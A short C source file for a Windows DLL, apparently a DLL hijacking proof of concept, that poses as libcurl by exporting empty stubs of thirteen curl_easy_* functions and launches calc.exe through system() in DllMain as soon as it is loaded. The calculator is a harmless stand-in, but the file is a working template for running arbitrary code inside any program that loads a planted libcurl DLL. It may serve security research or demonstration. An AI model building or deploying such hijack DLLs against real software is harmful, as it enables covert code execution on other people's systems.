#include <stdio.h>
#include <windows.h>

extern __declspec(dllexport) void curl_easy_setopt(void){ return; }
extern __declspec(dllexport) void curl_easy_cleanup(void) { return; }
extern __declspec(dllexport) void curl_easy_duphandle(void) { return; }
extern __declspec(dllexport) void curl_easy_escape(void) { return; }
extern __declspec(dllexport) void curl_easy_getinfo(void) { return; }
extern __declspec(dllexport) void curl_easy_init(void) { return; }
extern __declspec(dllexport) void curl_easy_pause(void) { return; }
extern __declspec(dllexport) void curl_easy_perform(void) { return; }
extern __declspec(dllexport) void curl_easy_recv(void) { return; }
extern __declspec(dllexport) void curl_easy_reset(void) { return; }
extern __declspec(dllexport) void curl_easy_send(void) { return; }
extern __declspec(dllexport) void curl_easy_strerror(void) { return; }
extern __declspec(dllexport) void curl_easy_unescape(void) { return; }

void DllUnregisterServer(void)
{
	system("calc.exe");
	return;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lol)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		DllUnregisterServer();
		break;
	}
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}
